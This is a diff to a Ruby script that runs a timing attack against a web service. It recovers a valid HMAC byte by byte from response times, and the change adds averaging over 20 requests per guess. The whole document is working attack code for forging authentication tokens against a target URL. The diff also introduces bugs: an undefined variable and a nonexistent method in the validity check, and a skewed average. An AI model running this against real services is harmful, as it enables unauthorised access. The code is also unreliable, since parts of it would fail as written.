@@ -2,11 +2,12 @@
 
 require 'net/http'
 require 'uri'
+require 'benchmark'
 #
 # Check arguments
 #
 if ARGV.size != 2
-  puts "[+] HMAC Timing Discovery 1.0"
+  puts "[+] HMAC Timing Discovery 2.0"
   puts "[+] Usage: #{__FILE__} <target url> <mac guess>"
   exit 1
 end
@@ -16,6 +17,7 @@ end
 url      = ARGV[0]
 base_mac = ARGV[1]
 out_file = '/tmp/hmac'
+N        = 20
 #
 # Store response time in a struct
 #
@@ -26,10 +28,15 @@ ResponseTime = Struct.new(:mac, :time)
 # URI::HTTP -> Fixnum
 #
 def get_response_time(uri)
-  t0 = Time.now
-  res = Net::HTTP.get_response(uri)
-
-  Time.now - t0
+  Benchmark.realtime { Net::HTTP.get_response(uri) }
+end
+#
+# Gets reponse time for a given URI
+# 
+# URI::HTTP -> Fixnum
+#
+def get_avg_response_time(uri, n)
+  (0...n).reduce { |sum, _| sum += get_response_time(uri) } / (n.nonzero? || 1)
 end
 #
 # Checks a supplied mac is valid
@@ -37,7 +44,7 @@ end
 # HEX -> Boolean
 #
 def valid?(mac, url)
-  Net::HTTP.get_response(URI.parse(url + mac)).code == '200'
+  Net::HTTP.get_response(uri).status_code == '200'
 end
 #
 # ASCII -> HEX String
@@ -59,7 +66,7 @@ end
 def guess_next_byte(url, mac)
   (0..255).reduce(ResponseTime.new(mac, 0)) { |result, byte|
     tmp_mac = mac + hex_s(byte.chr)
-    t       = get_response_time(URI.parse(url + tmp_mac))
+    t       = get_avg_response_time(URI.parse(url + tmp_mac), N)
 
     print "[+] Calculating..." + tmp_mac + "\r"
     
@@ -75,7 +82,7 @@ end
 #
 # MAIN
 # 
-puts "[+] Starting timing attack...."
+puts "[+] Starting statistical timing attack...(this will take a while)"
 
 valid_mac = ascii_s(base_mac).chars.reduce('') do |mac, char|
   mac = guess_next_byte(url, mac)
